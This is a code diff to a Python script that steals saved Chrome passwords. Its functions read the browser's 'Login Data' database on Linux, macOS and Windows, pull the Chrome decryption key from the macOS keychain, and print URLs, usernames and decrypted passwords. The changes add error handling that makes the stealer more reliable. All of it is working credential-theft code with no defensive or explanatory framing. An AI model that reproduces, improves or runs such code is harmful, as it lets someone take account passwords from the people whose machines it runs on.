@@ -45,9 +45,13 @@ def steal_linux_basic():
 	# Get the passwords
 	data = query_db(os.path.expanduser('~/.config/google-chrome/Default/Login Data'))
 	# Are there any passwords?
+	if not isinstance(data,list):
+		return data
 	if len(data) > 0:
 		# Loop through the passwords
 		for result in data:
+			if len(result) != 3:
+				continue
 			# If the URL is blank,print it as (Unknown)
 			if(len(result[0]) <= 0):
 				result[0] = "(Unknown)"
@@ -59,6 +63,8 @@ def steal_linux_basic():
 				result[2] = "(Blank)"
 			# Append to results
 			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2].decode('utf-8')))
+		if len(recovered) < 0:
+			return('[-] There are no saved passwords')
 		return recovered
 	else:
 		# There are no saved passwords
@@ -69,6 +75,9 @@ def steal_osx():
 	# Get the passwords
 	data = query_db(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
 	# Get the encrpytion key from the keychain
+	# Are there any passwords?
+	if not isinstance(data,list):
+		return data
 	safe_storage_key = subprocess.Popen("security find-generic-password -wa "
 					    "'Chrome'",
 				            stdout=subprocess.PIPE,
@@ -114,6 +123,9 @@ def steal_windows():
 	recovered = list()
 	# Get the passwords
 	data = query_db(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
+	# Are there any passwords?
+	if not isinstance(data,list):
+		return data
 	# Check if there is any data
 	if len(data) > 0:
 		for result in data:
